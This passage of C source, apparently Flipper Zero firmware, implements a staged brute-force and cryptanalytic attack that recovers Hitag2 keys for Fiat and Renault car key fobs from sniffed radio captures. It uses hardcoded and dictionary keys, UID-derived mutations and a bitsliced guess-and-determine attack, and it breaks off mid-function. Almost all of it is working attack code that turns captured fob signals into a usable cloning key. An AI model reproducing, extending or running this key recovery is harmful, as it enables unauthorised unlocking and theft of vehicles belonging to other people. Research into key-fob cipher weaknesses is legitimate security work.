// [HITAG2_BF] Hitag2 bruteforce state machine for Fiat V1
//
// Cascade L1..L5:
//   L1 Known    - 8 keys hardcoded in fiat_v1.c
//   L2 FlashDct - ~90 curated keys embedded in flash
//   L3 SDDict   - streaming dictionary from apps_data/subghz/assets/
//   L4 Heurist  - mutations (UID-derived, epoch, byte increments)
//   L5 Hitag2Hl - guess-and-determine attack (Hitag2Hell) via
//                 subghz_hitag2_hell.h, 32-way bitsliced adapted to Fiat V1.

#include "subghz_hitag2_bf.h"
#include "subghz_hitag2_core.h"
#include "subghz_hitag2_hell.h"

#include <lib/subghz/protocols/fiat_v1.h>
#include <lib/subghz/protocols/fiat_v2.h>
#include <lib/subghz/protocols/renault_v1.h>
#include <storage/storage.h>
#include <furi_hal.h>

#define TAG "Hitag2Bf"

// Yield-to-scheduler cadence (keys tested between callback invocations)
#define SUBGHZ_HITAG2_BF_YIELD_INTERVAL 512U

// L4 heuristic: how many mutations to try
#define SUBGHZ_HITAG2_BF_L4_MAX_KEYS 65536U

// L5 (Hitag2Hell): full L0 sweep is 2^20 slots. We split into chunks so we
// can call progress + yield often, and also to allow the caller to cancel
// promptly. Chunk size = 4096 slots ~= a few seconds each on Cortex-M4.
// Small L5 chunk so cancel/progress are polled between kernel calls often
// enough to keep BACK responsive (the outer loop re-checks instance->cancel per
// chunk). 256 matches qUnleashed's work-stealing chunk. A big chunk (e.g. 4096)
// could run for minutes on the M4 before the outer cancel check ran, freezing
// the UI while BACK's furi_thread_join waited.
#define SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE 256U
#define SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS (1UL << 20)

struct SubGhzHitag2Bf {
    SubGhzHitag2BfCapture captures[SUBGHZ_HITAG2_BF_MAX_CAPTURES];
    uint8_t capture_count;

    uint8_t levels_mask;

    // Result
    bool found;
    uint8_t found_key[6];
    uint32_t found_epoch;
    uint8_t found_level;

    // Runtime stats
    uint64_t keys_tested_total;

    // Cancellation
    volatile bool cancel;
};

// -----------------------------------------------------------------------------

SubGhzHitag2Bf* subghz_hitag2_bf_alloc(void) {
    SubGhzHitag2Bf* instance = malloc(sizeof(SubGhzHitag2Bf));
    memset(instance, 0, sizeof(*instance));
    instance->levels_mask = 0xFFU; // all levels enabled by default
    return instance;
}

void subghz_hitag2_bf_free(SubGhzHitag2Bf* instance) {
    furi_check(instance);
    free(instance);
}

bool subghz_hitag2_bf_add_capture(
    SubGhzHitag2Bf* instance,
    uint32_t uid,
    uint16_t control,
    uint8_t button,
    uint32_t hop) {
    furi_check(instance);

    if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
        return false;
    }
    // All captures MUST share the same UID
    if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
        FURI_LOG_W(TAG, "Rejecting capture with different UID");
        return false;
    }
    // Reject duplicates (same control+button)
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        if(instance->captures[i].control == control &&
           instance->captures[i].button == button &&
           instance->captures[i].hop == hop) {
            return false;
        }
    }

    SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
    memset(cap, 0, sizeof(*cap));
    cap->uid = uid;
    cap->control = control;
    cap->button = button;
    cap->hop = hop;
    cap->is_fiat_v2 = false;
    cap->iv_combo = 0;
    return true;
}

bool subghz_hitag2_bf_add_capture_v2(
    SubGhzHitag2Bf* instance,
    uint32_t uid,
    uint32_t hop,
    const uint8_t raw[14]) {
    furi_check(instance);
    furi_check(raw);

    if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
        return false;
    }
    // All captures MUST share the same UID
    if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
        FURI_LOG_W(TAG, "Rejecting capture with different UID");
        return false;
    }
    // Combo-0 placeholder IV values (real combo resolved during verify/invert).
    uint8_t button = subghz_protocol_fiat_v2_iv_button_for_combo(raw, 0);
    uint16_t control = subghz_protocol_fiat_v2_iv_control_for_combo(raw, 0);

    // Reject duplicate frames (identical raw + hop already stored)
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        if(instance->captures[i].is_fiat_v2 && instance->captures[i].hop == hop &&
           memcmp(instance->captures[i].raw, raw, 14) == 0) {
            return false;
        }
    }

    SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
    memset(cap, 0, sizeof(*cap));
    cap->uid = uid;
    cap->control = control;
    cap->button = button;
    cap->hop = hop;
    cap->is_fiat_v2 = true;
    cap->iv_combo = 0;
    memcpy(cap->raw, raw, 14);
    return true;
}

bool subghz_hitag2_bf_add_capture_renault_v1(
    SubGhzHitag2Bf* instance,
    uint32_t uid,
    uint64_t payload42,
    uint8_t button,
    uint8_t counter) {
    furi_check(instance);

    if(instance->capture_count >= SUBGHZ_HITAG2_BF_MAX_CAPTURES) {
        return false;
    }
    // All captures MUST share the same UID
    if(instance->capture_count > 0 && instance->captures[0].uid != uid) {
        FURI_LOG_W(TAG, "Rejecting capture with different UID");
        return false;
    }
    // Reject duplicates (same uid + payload42)
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        if(instance->captures[i].is_renault_v1 && instance->captures[i].uid == uid &&
           instance->captures[i].payload42 == payload42) {
            return false;
        }
    }

    SubGhzHitag2BfCapture* cap = &instance->captures[instance->capture_count++];
    memset(cap, 0, sizeof(*cap));
    cap->uid = uid;
    cap->is_renault_v1 = true;
    cap->payload42 = payload42;
    cap->rv1_button = button;
    cap->rv1_counter = counter;
    cap->hop_slice = 0;
    cap->iv_combo = 0;
    return true;
}

uint8_t subghz_hitag2_bf_get_capture_iv_combo(const SubGhzHitag2Bf* instance, uint8_t index) {
    furi_check(instance);
    if(index >= instance->capture_count) return 0;
    return instance->captures[index].iv_combo;
}

uint8_t subghz_hitag2_bf_get_capture_hop_slice(const SubGhzHitag2Bf* instance, uint8_t index) {
    furi_check(instance);
    if(index >= instance->capture_count) return 0;
    return instance->captures[index].hop_slice;
}

uint8_t subghz_hitag2_bf_get_capture_count(const SubGhzHitag2Bf* instance) {
    furi_check(instance);
    return instance->capture_count;
}

uint32_t subghz_hitag2_bf_get_uid(const SubGhzHitag2Bf* instance) {
    furi_check(instance);
    return instance->capture_count > 0 ? instance->captures[0].uid : 0;
}

bool subghz_hitag2_bf_get_capture(
    const SubGhzHitag2Bf* instance,
    uint8_t index,
    uint32_t* uid_out,
    uint16_t* control_out,
    uint8_t* button_out,
    uint32_t* hop_out) {
    furi_check(instance);
    if(index >= instance->capture_count) return false;
    const SubGhzHitag2BfCapture* cap = &instance->captures[index];
    if(uid_out) *uid_out = cap->uid;
    if(control_out) *control_out = cap->control;
    if(button_out) *button_out = cap->button;
    if(hop_out) *hop_out = cap->hop;
    return true;
}

bool subghz_hitag2_bf_get_capture_is_fiat_v2(const SubGhzHitag2Bf* instance, uint8_t index) {
    furi_check(instance);
    if(index >= instance->capture_count) return false;
    return instance->captures[index].is_fiat_v2;
}

bool subghz_hitag2_bf_get_capture_is_renault_v1(const SubGhzHitag2Bf* instance, uint8_t index) {
    furi_check(instance);
    if(index >= instance->capture_count) return false;
    return instance->captures[index].is_renault_v1;
}

bool subghz_hitag2_bf_get_capture_raw(
    const SubGhzHitag2Bf* instance,
    uint8_t index,
    uint8_t raw_out[14]) {
    furi_check(instance);
    furi_check(raw_out);
    if(index >= instance->capture_count) return false;
    memcpy(raw_out, instance->captures[index].raw, 14);
    return true;
}

bool subghz_hitag2_bf_get_capture_rv1(
    const SubGhzHitag2Bf* instance,
    uint8_t index,
    uint64_t* payload42_out,
    uint8_t* button_out,
    uint8_t* counter_out) {
    furi_check(instance);
    if(index >= instance->capture_count) return false;
    const SubGhzHitag2BfCapture* cap = &instance->captures[index];
    if(payload42_out) *payload42_out = cap->payload42;
    if(button_out) *button_out = cap->rv1_button;
    if(counter_out) *counter_out = cap->rv1_counter;
    return true;
}

void subghz_hitag2_bf_set_levels(SubGhzHitag2Bf* instance, uint8_t levels_mask) {
    furi_check(instance);
    instance->levels_mask = levels_mask;
}

bool subghz_hitag2_bf_get_result(
    const SubGhzHitag2Bf* instance,
    uint8_t key_out[6],
    uint32_t* epoch_out,
    uint8_t* level_out) {
    furi_check(instance);
    if(!instance->found) return false;
    if(key_out) memcpy(key_out, instance->found_key, 6);
    if(epoch_out) *epoch_out = instance->found_epoch;
    if(level_out) *level_out = instance->found_level;
    return true;
}

uint64_t subghz_hitag2_bf_get_total_keys_tested(const SubGhzHitag2Bf* instance) {
    furi_check(instance);
    return instance->keys_tested_total;
}

// Verify a single V1 capture with its stored (button, control).
static bool subghz_hitag2_bf_verify_cap_v1(
    const SubGhzHitag2BfCapture* cap,
    const uint8_t key[6],
    uint32_t epoch) {
    return subghz_protocol_fiat_v1_verify_key(
        cap->uid, cap->button, cap->control, cap->hop, key, epoch);
}

// Verify a single V2 capture using a specific IV combo.
static bool subghz_hitag2_bf_verify_cap_v2_combo(
    const SubGhzHitag2BfCapture* cap,
    const uint8_t key[6],
    uint32_t epoch,
    uint8_t combo) {
    uint8_t button_c = subghz_protocol_fiat_v2_iv_button_for_combo(cap->raw, combo);
    uint16_t control_c = subghz_protocol_fiat_v2_iv_control_for_combo(cap->raw, combo);
    return subghz_protocol_fiat_v1_verify_key(
        cap->uid, button_c, control_c, cap->hop, key, epoch);
}

// Verify a single Renault V1 capture with a specific (slice, combo). Renault V1
// reuses the Fiat V1 cipher: uid direct, IV = (iv_button, iv_control) for combo,
// hop = candidate_hop(payload42, slice).
static bool subghz_hitag2_bf_verify_cap_rv1_slice_combo(
    const SubGhzHitag2BfCapture* cap,
    const uint8_t key[6],
    uint32_t epoch,
    uint8_t slice,
    uint8_t combo) {
    uint8_t iv_btn = subghz_protocol_renault_v1_iv_button(cap->rv1_button, combo);
    uint16_t iv_ctrl = subghz_protocol_renault_v1_iv_control(cap->rv1_counter, combo);
    uint32_t hop = subghz_protocol_renault_v1_candidate_hop(cap->payload42, slice);
    return subghz_protocol_fiat_v1_verify_key(cap->uid, iv_btn, iv_ctrl, hop, key, epoch);
}

// Core cross-validation used by both the const public verify and the resolver.
// Returns true if `key` validates ALL captures.
//   - Fiat V1 captures: must pass with their own stored IV.
//   - Fiat V2 captures: a SINGLE IV combo (0..3) must validate every V2 capture
//     simultaneously (the fob uses one fixed IV convention); when found,
//     *combo_out receives it.
//   - Renault V1 captures: a SINGLE (slice, combo) pair from
//     [0..HOP_SLICE_COUNT) x [0..IV_COMBO_COUNT) must validate every Renault V1
//     capture simultaneously; when found, *slice_out/*combo_out receive it.
// If a mix of protocols is present, each protocol's own constraint must hold.
static bool subghz_hitag2_bf_verify_multi_impl(
    const SubGhzHitag2Bf* instance,
    const uint8_t key[6],
    uint32_t epoch,
    uint8_t* combo_out,
    uint8_t* slice_out) {
    // First, all V1 captures must pass unconditionally.
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        const SubGhzHitag2BfCapture* cap = &instance->captures[i];
        if(cap->is_fiat_v2 || cap->is_renault_v1) continue;
        if(!subghz_hitag2_bf_verify_cap_v1(cap, key, epoch)) {
            return false;
        }
    }

    // Count V2 and Renault V1 captures.
    bool any_v2 = false;
    bool any_rv1 = false;
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        if(instance->captures[i].is_fiat_v2) any_v2 = true;
        if(instance->captures[i].is_renault_v1) any_rv1 = true;
    }

    // Fiat V2: find a single combo that validates EVERY V2 capture.
    if(any_v2) {
        bool v2_ok = false;
        for(uint8_t combo = 0; combo < FIAT_V2_IV_COMBO_COUNT; combo++) {
            bool all_ok = true;
            for(uint8_t i = 0; i < instance->capture_count; i++) {
                const SubGhzHitag2BfCapture* cap = &instance->captures[i];
                if(!cap->is_fiat_v2) continue;
                if(!subghz_hitag2_bf_verify_cap_v2_combo(cap, key, epoch, combo)) {
                    all_ok = false;
                    break;
                }
            }
            if(all_ok) {
                if(combo_out) *combo_out = combo;
                v2_ok = true;
                break;
            }
        }
        if(!v2_ok) return false;
    } else if(combo_out) {
        *combo_out = 0;
    }

    // Renault V1: find a single (slice, combo) that validates EVERY RV1 capture.
    if(any_rv1) {
        bool rv1_ok = false;
        for(uint8_t slice = 0; slice < RENAULT_V1_HOP_SLICE_COUNT && !rv1_ok; slice++) {
            for(uint8_t combo = 0; combo < RENAULT_V1_IV_COMBO_COUNT; combo++) {
                bool all_ok = true;
                for(uint8_t i = 0; i < instance->capture_count; i++) {
                    const SubGhzHitag2BfCapture* cap = &instance->captures[i];
                    if(!cap->is_renault_v1) continue;
                    if(!subghz_hitag2_bf_verify_cap_rv1_slice_combo(
                           cap, key, epoch, slice, combo)) {
                        all_ok = false;
                        break;
                    }
                }
                if(all_ok) {
                    if(slice_out) *slice_out = slice;
                    if(combo_out) *combo_out = combo;
                    rv1_ok = true;
                    break;
                }
            }
        }
        if(!rv1_ok) return false;
    } else if(slice_out) {
        *slice_out = 0;
    }

    return true;
}

bool subghz_hitag2_bf_verify_multi(
    const SubGhzHitag2Bf* instance,
    const uint8_t key[6],
    uint32_t epoch) {
    return subghz_hitag2_bf_verify_multi_impl(instance, key, epoch, NULL, NULL);
}

// Like verify_multi but records the winning IV combo (V2 and RV1) and hop slice
// (RV1) into every matching capture so the scene can persist it. Non-const
// because it mutates capture state.
static bool subghz_hitag2_bf_verify_multi_resolve(
    SubGhzHitag2Bf* instance,
    const uint8_t key[6],
    uint32_t epoch) {
    uint8_t combo = 0;
    uint8_t slice = 0;
    if(!subghz_hitag2_bf_verify_multi_impl(instance, key, epoch, &combo, &slice)) {
        return false;
    }
    for(uint8_t i = 0; i < instance->capture_count; i++) {
        if(instance->captures[i].is_fiat_v2) {
            instance->captures[i].iv_combo = combo;
        } else if(instance->captures[i].is_renault_v1) {
            instance->captures[i].iv_combo = combo;
            instance->captures[i].hop_slice = slice;
        }
    }
    return true;
}

bool subghz_hitag2_bf_verify_multi_resolve_key(
    SubGhzHitag2Bf* instance,
    const uint8_t key[6],
    uint32_t epoch) {
    furi_check(instance);
    return subghz_hitag2_bf_verify_multi_resolve(instance, key, epoch);
}

// -----------------------------------------------------------------------------
// Level implementations
// -----------------------------------------------------------------------------

// L1: 8 hardcoded known keys from fiat_v1.c
static bool subghz_hitag2_bf_run_l1(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    const uint8_t(*known_keys)[6] = subghz_protocol_fiat_v1_get_known_keys();
    for(uint8_t i = 0; i < FIAT_V1_KNOWN_KEY_COUNT; i++) {
        if(instance->cancel) return false;
        if(subghz_hitag2_bf_verify_multi_resolve(instance, known_keys[i], 0)) {
            memcpy(instance->found_key, known_keys[i], 6);
            instance->found_epoch = 0;
            instance->found_level = SubGhzHitag2BfLevelKnown;
            instance->found = true;
            return true;
        }
        instance->keys_tested_total++;
    }
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelKnown,
            "Known keys",
            100,
            instance->keys_tested_total,
            context);
    }
    return false;
}

// L2: extended flash dictionary
static bool subghz_hitag2_bf_run_l2(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    const uint32_t total = subghz_hitag2_bf_flash_dict_size();
    // [BUGFIX] Emit an initial 0% frame so the UI switches from L1 to L2
    // immediately, even if the whole dict runs in <100ms.
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelFlashDict,
            "Flash Dict",
            0,
            instance->keys_tested_total,
            context);
    }
    for(uint32_t i = 0; i < total; i++) {
        if(instance->cancel) return false;
        const uint8_t(*key)[6] = subghz_hitag2_bf_flash_dict_get(i);
        if(!key) break;
        if(subghz_hitag2_bf_verify_multi_resolve(instance, *key, 0)) {
            memcpy(instance->found_key, *key, 6);
            instance->found_epoch = 0;
            instance->found_level = SubGhzHitag2BfLevelFlashDict;
            instance->found = true;
            return true;
        }
        instance->keys_tested_total++;

        if((i & 0x1FU) == 0 && progress_cb) {
            uint8_t pct = (uint8_t)((uint32_t)(i + 1) * 100U / total);
            if(!progress_cb(
                   SubGhzHitag2BfLevelFlashDict,
                   "Flash Dict",
                   pct,
                   instance->keys_tested_total,
                   context)) {
                instance->cancel = true;
                return false;
            }
        }
    }
    // [BUGFIX] Flush final 100% so the UI does not stay frozen at the last
    // reported frame (was 72% for a 90-entry dict, causing the "stuck at 73%"
    // bug report). L3 may skip silently if no SD dict is present, so without
    // this flush the UI stays on L2's stale frame until L4 hits a checkpoint.
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelFlashDict,
            "Flash Dict",
            100,
            instance->keys_tested_total,
            context);
    }
    return false;
}

// L3: SD dictionary streaming (apps_data/subghz/assets/hitag2)
// Format: one 12-hex-char key per line (may have # comments and blank lines)
static uint8_t hex_char_to_nibble(char c) {
    if(c >= '0' && c <= '9') return (uint8_t)(c - '0');
    if(c >= 'a' && c <= 'f') return (uint8_t)(c - 'a' + 10);
    if(c >= 'A' && c <= 'F') return (uint8_t)(c - 'A' + 10);
    return 0xFFU;
}

static bool parse_hex_key(const char* line, uint8_t key_out[6]) {
    // Skip whitespace
    while(*line == ' ' || *line == '\t') line++;
    if(*line == '#' || *line == '\0' || *line == '\r' || *line == '\n') return false;
    uint8_t nibbles[12];
    uint8_t got = 0;
    while(*line && got < 12) {
        if(*line == ' ' || *line == '\t' || *line == ':') {
            line++;
            continue;
        }
        uint8_t n = hex_char_to_nibble(*line);
        if(n == 0xFFU) break;
        nibbles[got++] = n;
        line++;
    }
    if(got != 12) return false;
    for(uint8_t i = 0; i < 6; i++) {
        key_out[i] = (uint8_t)((nibbles[i * 2] << 4) | nibbles[i * 2 + 1]);
    }
    return true;
}

static bool subghz_hitag2_bf_run_l3(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    // [BUGFIX] Emit initial 0% frame so the UI transitions from L2 to L3 even
    // if L3 skips silently (no SD dict file present).
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelSDDict,
            "SD Dict",
            0,
            instance->keys_tested_total,
            context);
    }

    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    bool opened = storage_file_open(
        file, APP_DATA_PATH("/subghz/assets/hitag2"),
        FSAM_READ, FSOM_OPEN_EXISTING);

    if(!opened) {
        // Try alternative path (some flippers may have subghz/assets in EXT)
        storage_file_close(file);
        opened = storage_file_open(
            file, EXT_PATH("subghz/assets/hitag2"),
            FSAM_READ, FSOM_OPEN_EXISTING);
    }

    if(!opened) {
        storage_file_free(file);
        furi_record_close(RECORD_STORAGE);
        FURI_LOG_I(TAG, "L3: no SD dictionary file, skipping");
        // [BUGFIX] Flush 100% so UI does not stay on the initial 0% frame
        // when L3 skips.
        if(progress_cb) {
            progress_cb(
                SubGhzHitag2BfLevelSDDict,
                "SD Dict",
                100,
                instance->keys_tested_total,
                context);
        }
        return false;
    }

    uint64_t total_size = storage_file_size(file);
    uint64_t bytes_read_total = 0;

    char line_buf[64];
    uint8_t line_pos = 0;
    uint8_t key[6];
    char c;
    bool found = false;
    uint32_t report_counter = 0;

    while(!instance->cancel) {
        uint16_t got = storage_file_read(file, &c, 1);
        if(got == 0) {
            // EOF - process any pending line
            if(line_pos > 0) {
                line_buf[line_pos] = '\0';
                if(parse_hex_key(line_buf, key)) {
                    if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                        memcpy(instance->found_key, key, 6);
                        instance->found_epoch = 0;
                        instance->found_level = SubGhzHitag2BfLevelSDDict;
                        instance->found = true;
                        found = true;
                    }
                    instance->keys_tested_total++;
                }
            }
            break;
        }
        bytes_read_total++;
        if(c == '\n' || c == '\r') {
            if(line_pos > 0) {
                line_buf[line_pos] = '\0';
                if(parse_hex_key(line_buf, key)) {
                    if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                        memcpy(instance->found_key, key, 6);
                        instance->found_epoch = 0;
                        instance->found_level = SubGhzHitag2BfLevelSDDict;
                        instance->found = true;
                        found = true;
                        break;
                    }
                    instance->keys_tested_total++;
                    report_counter++;
                    if(report_counter >= 512U && progress_cb) {
                        report_counter = 0;
                        uint8_t pct = total_size > 0 ?
                                          (uint8_t)((bytes_read_total * 100U) / total_size) :
                                          0;
                        if(!progress_cb(
                               SubGhzHitag2BfLevelSDDict,
                               "SD Dict",
                               pct,
                               instance->keys_tested_total,
                               context)) {
                            instance->cancel = true;
                            break;
                        }
                    }
                }
                line_pos = 0;
            }
        } else if((size_t)(line_pos + 1) < sizeof(line_buf)) {
            line_buf[line_pos++] = c;
        } else {
            // Line too long, reset
            line_pos = 0;
        }
    }

    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    // [BUGFIX] Flush final 100% frame so UI transitions to L4 promptly.
    if(!found && progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelSDDict,
            "SD Dict",
            100,
            instance->keys_tested_total,
            context);
    }
    return found;
}

// L4: heuristic mutations based on the UID and known-key patterns
static bool subghz_hitag2_bf_run_l4(
    SubGhzHitag2Bf* instance,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    uint32_t uid = subghz_hitag2_bf_get_uid(instance);
    uint8_t key[6];
    uint32_t tried = 0;

    // [BUGFIX] Emit initial 0% frame so the UI transitions from L3 to L4.
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelHeuristic,
            "Heuristic",
            0,
            instance->keys_tested_total,
            context);
    }

    // Strategy 1: XOR common masks with UID and pad with common tails
    // UID split into bytes; combined with typical BCM constants
    static const uint8_t tails[][2] = {
        {0x00, 0x00}, {0xFF, 0xFF}, {0x00, 0xFF}, {0xFF, 0x00},
        {0xAA, 0x55}, {0x55, 0xAA}, {0x12, 0x34}, {0xAB, 0xCD},
        {0xDE, 0xAD}, {0xBE, 0xEF}, {0xCA, 0xFE}, {0xBA, 0xBE},
        {0x00, 0x01}, {0x00, 0x02}, {0x00, 0x08}, {0x00, 0x10},
        {0x01, 0x00}, {0x10, 0x00}, {0x00, 0x99}, {0x99, 0x00},
    };
    static const uint32_t xor_masks[] = {
        0x00000000UL, 0xFFFFFFFFUL, 0xA5A5A5A5UL, 0x5A5A5A5AUL,
        0x12345678UL, 0xDEADBEEFUL, 0xCAFEBABEUL, 0x1F2E3D4CUL,
        0x87654321UL, 0xF0F0F0F0UL, 0x0F0F0F0FUL, 0xC3C3C3C3UL,
    };

    for(size_t mi = 0; mi < sizeof(xor_masks) / sizeof(xor_masks[0]); mi++) {
        for(size_t ti = 0; ti < sizeof(tails) / sizeof(tails[0]); ti++) {
            if(instance->cancel) return false;
            uint32_t patched = uid ^ xor_masks[mi];
            key[0] = (uint8_t)(patched >> 24);
            key[1] = (uint8_t)(patched >> 16);
            key[2] = (uint8_t)(patched >> 8);
            key[3] = (uint8_t)patched;
            key[4] = tails[ti][0];
            key[5] = tails[ti][1];
            if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                memcpy(instance->found_key, key, 6);
                instance->found_epoch = 0;
                instance->found_level = SubGhzHitag2BfLevelHeuristic;
                instance->found = true;
                return true;
            }
            instance->keys_tested_total++;
            tried++;

            if((tried & 0xFFU) == 0 && progress_cb) {
                uint8_t pct =
                    (uint8_t)((tried * 100U) / SUBGHZ_HITAG2_BF_L4_MAX_KEYS);
                if(pct > 100) pct = 100;
                if(!progress_cb(
                       SubGhzHitag2BfLevelHeuristic,
                       "Heuristic",
                       pct,
                       instance->keys_tested_total,
                       context)) {
                    instance->cancel = true;
                    return false;
                }
            }
        }
    }

    // Strategy 2: increment ±16 the last byte of each known key
    const uint8_t(*known_keys)[6] = subghz_protocol_fiat_v1_get_known_keys();
    for(uint8_t k = 0; k < FIAT_V1_KNOWN_KEY_COUNT; k++) {
        for(int delta = -16; delta <= 16; delta++) {
            if(delta == 0) continue;
            if(instance->cancel) return false;
            memcpy(key, known_keys[k], 6);
            key[5] = (uint8_t)(key[5] + delta);
            if(subghz_hitag2_bf_verify_multi_resolve(instance, key, 0)) {
                memcpy(instance->found_key, key, 6);
                instance->found_epoch = 0;
                instance->found_level = SubGhzHitag2BfLevelHeuristic;
                instance->found = true;
                return true;
            }
            instance->keys_tested_total++;
            tried++;
        }
    }

    // Strategy 3: try each known key with epoch 1..7 (small window)
    for(uint8_t k = 0; k < FIAT_V1_KNOWN_KEY_COUNT; k++) {
        for(uint32_t epoch = 1; epoch <= 7; epoch++) {
            if(instance->cancel) return false;
            if(subghz_hitag2_bf_verify_multi_resolve(instance, known_keys[k], epoch)) {
                memcpy(instance->found_key, known_keys[k], 6);
                instance->found_epoch = epoch;
                instance->found_level = SubGhzHitag2BfLevelHeuristic;
                instance->found = true;
                return true;
            }
            instance->keys_tested_total++;
            tried++;
        }
    }

    // [BUGFIX] Flush final 100% frame so UI transitions to L5 promptly.
    if(progress_cb) {
        progress_cb(
            SubGhzHitag2BfLevelHeuristic,
            "Heuristic",
            100,
            instance->keys_tested_total,
            context);
    }
    return false;
}

// L5: Hitag2Hell guess-and-determine attack.
//
// Uses the 32-way bitsliced port in subghz_hitag2_hell.[ch]. For each capture
// available we run the attack against its authenticator; the resulting state31
// candidates are inverted to keys via hitag2_fiat_invert_init(); each key is
// then cross-validated against ALL captures to eliminate false positives (the
// per-capture false-positive rate is ~2^-32 with a single 32-bit auth; two
// captures drops it to ~2^-64, effectively zero).
//
// The L0 sweep space is 2^20 slots; we split it into chunks so the progress
// callback fires often enough to keep the UI responsive and to allow prompt
// cancellation. Each chunk of 4096 slots takes on the order of seconds on
// x86; on Cortex-M4 the total wall time can be several hours to a day in the
// worst case, but many keys will be found much earlier.

typedef struct {
    SubGhzHitag2Bf* instance;
    SubGhzHitag2BfProgressCallback outer_cb;
    void* outer_ctx;
    uint32_t chunk_base;   // L0 base index of this chunk (0..2^20 in steps of CHUNK_SIZE)
    uint64_t keys_before_l5; // [BUGFIX] snapshot of keys_tested_total when L5 started
    uint32_t last_emit_tick; // wall-clock tick of the last UI update (for time-based cadence)
} Hitag2HellBridge;

// Update the UI / yield the CPU at most this often (ms). Matches PSA's smooth
// feel: a fixed wall-clock cadence regardless of how many L0 slots were
// processed (deep_search makes per-slot time wildly variable).
#define SUBGHZ_HITAG2_BF_UI_INTERVAL_MS 200U

static bool subghz_hitag2_bf_hell_progress(
    uint8_t pct_within_chunk, uint64_t states_tested, void* ctx) {
    Hitag2HellBridge* b = (Hitag2HellBridge*)ctx;
    // [BUGFIX] Do not clobber keys_tested_total accumulated by L1..L4. Add
    // L5's states_tested on top of the pre-L5 baseline. Otherwise the final
    // "Tried X keys" reported to the user shows only L5's states and hides
    // the L1..L4 work that already happened.
    b->instance->keys_tested_total = b->keys_before_l5 + states_tested;

    // Cancel is polled on EVERY callback (cheap) so BACK is honored promptly.
    if(b->instance->cancel) return false;

    // Throttle UI updates + the CPU yield to a fixed wall-clock cadence. This
    // keeps the progress bar smooth (like PSA) and, crucially, guarantees the
    // single-core M4's UI/input threads get CPU time regardless of how long a
    // deep_search burst runs — without the yield the equal-priority worker
    // starves the UI and BACK freezes.
    uint32_t now = furi_get_tick();
    if((now - b->last_emit_tick) < SUBGHZ_HITAG2_BF_UI_INTERVAL_MS) {
        return true;
    }
    b->last_emit_tick = now;

    if(b->outer_cb) {
        // Global percent = (chunk_base + pct_within_chunk/100 * CHUNK) / TOTAL
        uint32_t base_slots = b->chunk_base;
        uint32_t within = (uint32_t)((SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE *
                                      (uint32_t)pct_within_chunk) / 100U);
        uint32_t global_slots = base_slots + within;
        if(global_slots > SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS) {
            global_slots = SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
        }
        uint8_t global_pct = (uint8_t)(((uint64_t)global_slots * 100ULL) /
                                       SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS);
        if(!b->outer_cb(
               SubGhzHitag2BfLevelHitag2Hell,
               "Hitag2Hell",
               global_pct,
               b->instance->keys_tested_total,
               b->outer_ctx)) {
            b->instance->cancel = true;
            return false;
        }
    }
    // Yield the CPU so the equal-priority UI/input service threads run and the
    // event loop can process BACK and repaint. This is exactly what keeps PSA
    // responsive; removing it was the regression that re-froze L5.
    furi_delay_ms(1);
    return true;
}

static bool subghz_hitag2_bf_try_hell_on_capture(
    SubGhzHitag2Bf* instance,
    const SubGhzHitag2BfCapture* cap,
    SubGhzHitag2BfProgressCallback progress_cb,
    void* context) {
    Hitag2HellBridge bridge;
    bridge.instance = instance;
    bridge.outer_cb = progress_cb;
    bridge.outer_ctx = context;
    // [BUGFIX] Snapshot keys_tested_total so L5's states_tested is added on top
    // of L1..L4 work rather than clobbering it.
    bridge.keys_before_l5 = instance->keys_tested_total;
    bridge.last_emit_tick = furi_get_tick();

    // Sweep the layer-0 space in chunks
    for(uint32_t chunk_start = 0;
        chunk_start < SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
        chunk_start += SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE) {
        if(instance->cancel) return false;

        bridge.chunk_base = chunk_start;

        Hitag2HellConfig cfg = {0};
        cfg.progress_cb = subghz_hitag2_bf_hell_progress;
        cfg.progress_ctx = &bridge;
        // Backstop: force the kernel to return within ~500ms even if it hasn't
        // hit its internal 1024-slot progress checkpoint, so the outer loop
        // re-checks instance->cancel and BACK stays responsive.
        cfg.timeout_ms = 500;
        cfg.now_ms_cb = furi_get_tick;
        cfg.l0_start = chunk_start;
        cfg.l0_end = chunk_start + SUBGHZ_HITAG2_BF_L5_CHUNK_SIZE;
        if(cfg.l0_end > SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS) {
            cfg.l0_end = SUBGHZ_HITAG2_BF_L5_TOTAL_SLOTS;
        }

